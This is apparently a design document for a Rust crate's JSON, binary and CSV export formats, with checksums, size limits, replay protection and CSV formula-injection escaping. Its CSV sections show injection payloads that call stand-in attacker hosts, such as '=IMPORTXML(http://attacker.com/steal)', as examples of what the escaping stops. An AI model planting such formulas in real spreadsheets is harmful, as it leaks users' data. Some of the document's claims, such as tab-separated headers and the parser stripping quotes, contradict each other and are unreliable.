# Data Migration Formats

This document specifies the export and import formats supported by the `data_migration` crate, with focus on format guarantees, CSV security measures, and lossless round-trip semantics.

## Overview

The `data_migration` crate provides three primary export/import formats:

| Format | Use Case | Lossless | Headers | Notes |
|--------|----------|----------|---------|-------|
| **JSON** | Human-readable, debugging | Yes | Typed with schema version | UTF-8 text, pretty-printed |
| **Binary** | Compact, fast serialization | Yes | Typed with schema version | Bincode format, efficient |
| **CSV** | Spreadsheet integration | Yes* | Tab-separated headers | Text-based, formula-safe |

*CSV is lossless for tabular payloads (e.g., `SavingsGoalsExport`). Binary and string data types are preserved through CSV round-trips.

## Format Specifications

### JSON Format

**File extension:** `.json`

**Structure:**

```json
{
  "header": {
    "version": 1,
    "checksum": "abc123...",
    "hash_algorithm": "sha256",
    "format": "json",
    "created_at_ms": 1234567890000
  },
  "payload": {
    "SavingsGoals": {
      "next_id": 2,
      "goals": [...]
    }
  }
}
```

**Characteristics:**

- UTF-8 encoded text file
- Pretty-printed for readability (indented JSON)
- Supports arbitrary Unicode strings (e.g., goal names in any language)
- Schema version embedded in header for compatibility checks
- Checksum (SHA-256) binds version, format, and canonical payload

**Security:** None—plaintext export. Callers should encrypt JSON files at rest.

**Import/Export functions:**

- `export_to_json(snapshot: &ExportSnapshot) -> Result<Vec<u8>, MigrationError>`
- `import_from_json(bytes: &[u8], tracker: &mut MigrationTracker, timestamp_ms: u64) -> Result<ExportSnapshot, MigrationError>`

### Binary Format

**File extension:** `.bin`

**Structure:**

Bincode serialization of [`ExportSnapshot`]. Bincode is a Rust-native binary format providing:

- Compact encoding (no whitespace, minimal framing)
- Type information sufficient for deserialization
- Length prefixes for arrays and strings
- Fast serialization and deserialization

**Characteristics:**

- Binary data: not human-readable
- More compact than JSON (~30% smaller)
- Faster to parse than JSON
- Supports arbitrary Unicode (UTF-8 encoded internally)
- Deterministic serialization order ensures stable checksums

**Security:** Binary format does not encrypt data. Callers should encrypt binary exports at rest.

**Import/Export functions:**

- `export_to_binary(snapshot: &ExportSnapshot) -> Result<Vec<u8>, MigrationError>`
- `import_from_binary(bytes: &[u8], tracker: &mut MigrationTracker, timestamp_ms: u64) -> Result<ExportSnapshot, MigrationError>`

### CSV Format

**File extension:** `.csv`

**Structure:**

Standard comma-separated values with RFC 4180 header row:

```csv
id,owner,name,target_amount,current_amount,target_date,locked
1,Alice,Emergency Fund,5000,1000,2000000000,false
2,Bob,=IMPORTXML(...),1000,100,2000000001,true
```

**Characteristics:**

- Text-based, suitable for spreadsheet applications
- Single header row describing columns
- One data record per line
- Supports Unicode strings (UTF-8 encoded)
- Comma field separator, with optional quoting for fields containing commas or newlines

**CSV-Injection Safety (Critical):**

Fields beginning with formula-triggering characters are **automatically escaped** to prevent formula injection in spreadsheet applications:

| Character | Meaning | Mitigation |
|-----------|---------|-----------|
| `=` | Excel formula start | Prefix with `'` → `'=...` |
| `+` | Some spreadsheet formula start | Prefix with `'` → `'+...` |
| `-` | Some spreadsheet formula start | Prefix with `'` → `'-...` |
| `@` | Excel/Google Sheets function | Prefix with `'` → `'@...` |

**Example:**

Goal with malicious name `=IMPORTXML(http://attacker.com/steal)` is exported as:

```csv
id,owner,name,target_amount,current_amount,target_date,locked
1,Alice,'=IMPORTXML(http://attacker.com/steal),5000,1000,2000000000,false
```

When imported into a spreadsheet, the leading single quote instructs the application to treat the field as text literal, not a formula. The quote is consumed by the spreadsheet and is not visible to the user.

Upon **re-importing** via `import_goals_from_csv()`, the leading quote is stripped by the CSV parser, and the goal name is reconstructed as-is: `=IMPORTXML(...)`. This is the correct behavior: the escaping is a **transport-layer safety measure**, not a data transformation.

**Validation Constraints:**

Importing CSV data is strictly fail-closed. Any malformed input will be rejected with `MigrationError` rather than being skipped or coerced:
- **Wrong Column Count:** Rows missing fields or containing extra fields trigger `MigrationError::DeserializeError`.
- **Type Mismatches:** Non-numeric strings in amount or date fields trigger `MigrationError::DeserializeError`.
- **Negative Values:** Negative amounts (`target_amount` or `current_amount`) trigger `MigrationError::ValidationFailed`.
- **Missing/Incorrect Header:** A missing or mismatched header row prevents mapping fields, triggering `MigrationError::DeserializeError`.
- **Capacity Bounds:** Payloads exceeding `MAX_MIGRATION_RECORDS` (1,024 records) trigger `MigrationError::TooManyRecords`.

**Import/Export functions:**

- `export_to_csv(payload: &SavingsGoalsExport) -> Result<Vec<u8>, MigrationError>`
- `import_goals_from_csv(bytes: &[u8]) -> Result<Vec<SavingsGoalExport>, MigrationError>`

---

## Checksum and Integrity

Every [`ExportSnapshot`] carries a SHA-256 checksum over:

```
SHA-256(version_le_bytes || format_utf8_bytes || canonical_payload_json)
```

**Binding properties:**

- **Version binding:** Prevents downgrade attacks. Importing a v1 snapshot as v0 is rejected.
- **Format binding:** Prevents format substitution. A JSON-format snapshot cannot be imported as binary.
- **Payload binding:** Detects any mutation of the payload after export.

**Verification:**

On import, `snapshot.validate_for_import()` checks:
1. Schema version is in range `[MIN_SUPPORTED_VERSION, SCHEMA_VERSION]`
2. Payload size and record count are within guardrails
3. Checksum matches the computed hash

Checksums mismatch triggers `MigrationError::ChecksumMismatch`.

---

## Lossless Round-Trip Guarantees

### JSON and Binary

Both JSON and binary formats preserve the full [`ExportSnapshot`], including:

- Payload type (RemittanceSplit, SavingsGoals, Generic)
- All field values with full precision
- Header metadata (version, format label, timestamp)

**Guarantee:** For any snapshot S:

```
export_to_format(S) -> bytes
import_from_format(bytes) -> S' such that:
  - S'.payload == S.payload
  - S'.header.checksum == S.header.checksum
  - S'.header.version == S.header.version
```

### CSV

CSV preserves individual goal records but loses the wrapper `SavingsGoalsExport.next_id`. Upon re-import:

```
SavingsGoalsExport { next_id: 5, goals: [...] }
  export_to_csv()
  → CSV bytes
  import_goals_from_csv()
  → Vec<SavingsGoalExport> of same length and content

// To reconstruct the full SavingsGoalsExport:
next_id: imported_goals.len() as u32,
goals: imported_goals,
```

This is acceptable because `next_id` is application state (tracking the next goal ID to allocate), not persistent user data.

**Guarantee for individual goals:** Goal fields round-trip exactly:

- `id`, `owner`, `name`, `target_amount`, `current_amount`, `target_date`, `locked` all match before/after CSV cycle
- Unicode in names and owner strings preserved (UTF-8 encoded)
- Numeric precision retained (i32, i64, u32, u64 types maintain exact values)

---

## Edge Cases and Limits

### Payload Size Constraints

| Constraint | Value | Rationale |
|-----------|-------|-----------|
| `MAX_MIGRATION_PAYLOAD_BYTES` | 64 KB | Prevent unbounded memory allocation |
| `MAX_MIGRATION_RECORDS` | 1,024 | Limit goals per export |
| `MAX_MIGRATION_SNAPSHOT_BYTES` | 96 KB | Full envelope size (payload + header + metadata) |

Violations trigger:
- `MigrationError::PayloadTooLarge`
- `MigrationError::TooManyRecords`
- `MigrationError::SnapshotTooLarge`

### Unicode Handling

All formats fully support Unicode strings (UTF-8):

**JSON:** Strings are UTF-8 encoded in the JSON serialization.

**Binary:** Strings are UTF-8 encoded in the bincode serialization.

**CSV:** Strings are UTF-8 encoded in the CSV output. Example:

```csv
id,owner,name,target_amount,current_amount,target_date,locked
1,用户1,目标1 🎯,5000,1000,2000000000,false
```

Round-trip is lossless: Unicode is preserved through all export/import cycles.

### Empty Payloads

All formats handle empty payloads:

**JSON:** Exports an empty goals array.

**Binary:** Encodes the structure with zero records.

**CSV:** Outputs header row only (no data rows).

Re-importing empty payloads produces empty goal lists (no error).

---

## Version Compatibility

The `data_migration` crate maintains backward compatibility via:

- **`MIN_SUPPORTED_VERSION`**: Minimum version number for import (currently 1)
- **`SCHEMA_VERSION`**: Current version number (currently 1)

On import:

```rust
if version < MIN_SUPPORTED_VERSION || version > SCHEMA_VERSION {
    return Err(MigrationError::IncompatibleVersion { found, min, max })
}
```

**Migration path for future versions:**

- v2 may add new fields to `SavingsGoalExport` (e.g., `category`)
- v2 may introduce new payload types (e.g., `InsurancePlans`)
- Legacy code (supporting v1 only) can still import v1 snapshots via explicit version check

---

## Replay Protection

The [`MigrationTracker`] prevents replay attacks (re-importing the same snapshot twice):

```rust
let mut tracker = MigrationTracker::new();
import_from_json(&bytes, &mut tracker, 1_000)?;      // OK
import_from_json(&bytes, &mut tracker, 2_000)?;      // ERROR: DuplicateImport
```

Tracking key: `(checksum, version)`. Snapshots are identified by their checksum and version, ensuring:

- Same payload + version = rejected
- Same checksum, different version = allowed (different schema)
- Different checksum = always allowed (different data)

---

## Security Notes

1. **No Confidentiality:** All formats export data in plain text or unencrypted binary. Callers must encrypt exports at rest or in transit.

2. **Integrity, Not Authentication:** Checksums detect accidental corruption, not malicious tampering. For authentication, sign the exported bytes with a cryptographic key.

3. **CSV Injection:** The `export_to_csv()` function sanitizes leading formula characters (`=`, `+`, `-`, `@`) by prefixing with a single quote. This prevents formula injection if the CSV is opened in a spreadsheet application.

4. **Timestamp Tracking:** Migration imports are timestamped via `MigrationTracker::mark_imported()`. Callers can audit import history.

---

## Examples

### JSON Export → Binary Roundtrip

```rust
let snapshot = ExportSnapshot::new(
    SnapshotPayload::SavingsGoals(goals),
    ExportFormat::Json,
);

// Export to JSON bytes
let json_bytes = export_to_json(&snapshot)?;

// Import from JSON
let mut tracker = MigrationTracker::new();
let imported = import_from_json(&json_bytes, &mut tracker, now_ms())?;

// Payload is identical
assert_eq!(imported.payload, snapshot.payload);
```

### CSV Export with Injection Safety

```rust
let payload = SavingsGoalsExport {
    next_id: 1,
    goals: vec![
        SavingsGoalExport {
            name: "=IMPORTXML(http://evil.com)".into(),
            ...
        },
    ],
};

let csv_bytes = export_to_csv(&payload)?;
// CSV file now contains: '=IMPORTXML(http://evil.com)
// When opened in Excel, the leading quote prevents formula execution.
```

### CSV Reimport

```rust
let csv_bytes = export_to_csv(&payload)?;
let goals = import_goals_from_csv(&csv_bytes)?;
// goals[0].name == "=IMPORTXML(...)" (unchanged; quote was consumed by CSV parser)
```

---

## Testing

All format guarantees are verified by:

1. **Round-trip tests:** Export → import cycle reproduces the original snapshot.
2. **CSV injection tests:** Leading formula characters are escaped; normal text is unmodified.
3. **Unicode tests:** Non-ASCII characters survive round-trips.
4. **Boundary tests:** Empty payloads, maximum sizes, and limit violations are handled correctly.
5. **Checksum tests:** Payload mutations invalidate the checksum.

See `data_migration/src/lib.rs` test module for implementation.

---

## References

- [RFC 4180 CSV Specification](https://tools.ietf.org/html/rfc4180)
- [CSV Injection (CWE-1236)](https://cwe.mitre.org/data/definitions/1236.html)
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
